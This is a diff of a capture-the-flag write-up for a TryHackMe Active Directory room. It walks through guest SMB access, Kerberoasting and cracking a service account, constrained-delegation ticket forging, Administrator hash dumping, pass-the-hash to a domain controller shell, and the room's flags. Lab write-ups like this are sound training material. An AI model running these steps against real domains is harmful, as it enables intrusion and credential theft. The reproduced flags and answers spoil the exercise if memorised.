@@ -81,7 +81,16 @@ $dbname = "cooctus_db";
 
 ## 2. Initial Access via Guest Account
 
-I tested for null/guest SMB authentication:
+I attempted an RDP connection to the Domain Controller:
+
+```bash
+rdesktop -f -u "" 10.64.158.191
+```
+
+RDP presented an **invalid/self-signed certificate** warning, but the session still connected. At the lock screen, I noticed the **wallpaper contained exposed credentials**, which provided an additional lead for further access/escalation.
+
+
+I tested for guest SMB authentication:
 ```bash
 crackmapexec smb DC.COOCTUS.CORP -u Visitor -p GuestLogin! 
 ```
@@ -92,7 +101,7 @@ SMB         10.64.158.191   445    DC               [*] Windows 10.0 Build 17763
 SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin!
 ```
 
-✔ **Success:** Guest credentials valid!
+**Success:** Guest credentials valid!
 
 I enumerated available shares:
 ```bash
@@ -139,7 +148,7 @@ Output:
 THM{Gu3st_Pl3as3}
 ```
 
-✔ **Success:** Initial flag captured via guest SMB access.
+**Success:** Initial flag captured via guest SMB access.
 
 ## 3. Active Directory Enumeration
 
@@ -186,7 +195,7 @@ I focused on the `reset` account:
 | reset | reset | password-reset | Domain Users  | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, TRUSTED_TO_AUTH_FOR_DELEGATION    | 1134 | HTTP/dc.cooctus.corp |
 
 
-✔ **JACKPOT:** The account has:
+**JACKPOT:** The account has:
 - Service Principal Name (SPN): `HTTP/dc.cooctus.corp`
 - `TRUSTED_TO_AUTH_FOR_DELEGATION` flag
 
@@ -210,7 +219,7 @@ HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021
 $krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$d4c2545fd3b55c659fc26ac0db49b7a4$f717a6c76064a45c2043ca13efcb03b04d3a26f852877cf785376fb98c305fae67dbd37f6f332a412b9fb2ed45132aad9283469a542f2c9419a28a11c723971caaa8ca22af0e4a437152a53cd3e1abfb76c177de777937f0a5b2feea0336258d225f0d84b76d17926c1c20d40169dd744c0b9b2046213cf5d1025d36c50755c659ec0b1279a0c7c5c19ef51ef3f129fd8cda3166a5b1faaf16efc22e26c9c28aa0470489a1b9b7ff4b516b842b9dbfc159f040063f0473dbeca278da03964317a8aa7629837b90d86a5c585c1dd7d55e981f2fbd2f2306d774538c7d1285b884d986444ed36580c305e36881f4aaa0c3a44b25153b1d753515696ccd57c65749a68d769b1bc92f3c9324db545ed44a87c11eb2aa62536c989db73eefe95ac6f8a4b5cd88e8c9b3da138ae02f770d6b0c01fd7da2a0d1231c2368e13f5e33a606455d679bf24b9cd3f13ca4a9dd3b9340588f66d81e326a3a5e6d3c7c7fe26b2f6cb2bfab9f1a72c8499a24d8099925ee7dffbe12f0e36a5b4735ae4dd24681b25b18f113a9c2294c67533c3b41276b1e911e2c77bf4b550bdf3ce760e6f4f3eb8cb0be75d31313e3c829a39cba24e97ef32b280e0b14ed0b0f2443cb848393155f718c1705e70b2c634de21a745ed12311db7655c616601111080f9d9e278c14ea3f6029a4f8723776e6ef4633fc1ed26dbdfe6a996a85ba8c5973715638a0e1e8c7acb5a18bc18c1f4a68f75e2e50d6a53961fd4424a61dfc7f540da8f078a8a6868fd3fac3fb6381ee908b8e6adea6a94a73d8110b9a13db149a6638f0dc1d833309d0383a24df2da6442b37c1e2509779249847fb86ff7e25e18307864f4053889e13ca06280c922da2f01af32a657543af821296bd929165ae3ed4bd9af391583965c1687d6f584ccae8bf4b4d22ebfd68db005d2af3978185e94239d3268bb4d3fed97a23265b4aa0702769000198ebfc5cc2da338ebfcef55cd039856587a9e74dc5c7e84dc315508b82166cc6c5e1d2f50d5f80d63038d4f539b6341855147543bab5b9286ff4fe54d8955d73b7a2d2a54211470e873dd537d840237a91cebd9547bd5578e5b52bb27b2a4b0413ca0d11e3f4c1fa7432e0eabba6b2afeca8f4809dad8e714a0b344332b10e8439498439dff7128f7139f11dd43338028eb9bd60a181004da731f601df5eead18d6443f83b5821a7b231276799d607b50b2434e8977f07e8f261a2267a198c4fc7546ab1f7c76152d2a99bad00bc7c47a6e5a462bfdbe75754be30f28cdc77df36dd1636aeb741c65848e915c899e0300bbd24058fb8abb2a79893a6b2dac20e8fb2c9ed2ee4e3415eb7a561
 ```
 
-✔ **Success:** TGS hash extracted. This is a type 23 (RC4-HMAC) ticket, which is faster to crack than AES.
+**Success:** TGS hash extracted. This is a type 23 (RC4-HMAC) ticket, which is faster to crack than AES.
 
 I verified the hash was saved:
 ```bash
@@ -243,7 +252,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-✔ **Success:** Password cracked in 3 seconds!
+**Success:** Password cracked in 3 seconds!
 
 **Credentials recovered:**
 ```
@@ -262,7 +271,7 @@ SMB         10.64.158.191   445    DC               [*] Windows 10.0 Build 17763
 SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\password-reset:resetpassword
 ```
 
-✔ **Success:** Credentials valid. Now I can abuse constrained delegation.
+**Success:** Credentials valid. Now I can abuse constrained delegation.
 
 ## 6. Analyzing Constrained Delegation
 
@@ -312,7 +321,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
 ```
 
-✔ **Success:** Forged service ticket for Administrator created!
+**Success:** Forged service ticket for Administrator created!
 
 I verified the ticket:
 ```bash
@@ -350,7 +359,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
 ```
 
-✔ **Success:** Administrator NTLM hash extracted: `add41095f1fb0405b32f70a489de022d`
+**Success:** Administrator NTLM hash extracted: `add41095f1fb0405b32f70a489de022d`
 
 **Key observation:** With the hash, I can perform pass-the-hash attacks to gain shell access.
 
@@ -369,7 +378,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents>
 ```
 
-✔ **Success:** Administrator shell on Domain Controller!
+**Success:** Administrator shell on Domain Controller!
 
 ## 10. Capturing Flags
 
@@ -408,7 +417,7 @@ Root flag:
 THM{Cr0ccCrewStr1kes!}
 ```
 
-✔ **SUCCESS:** All flags captured. Domain fully compromised.
+**SUCCESS:** All flags captured. Domain fully compromised.
 
 **Flags retrieved:**
 - `THM{Gu3st_Pl3as3}` - What is the User flag?
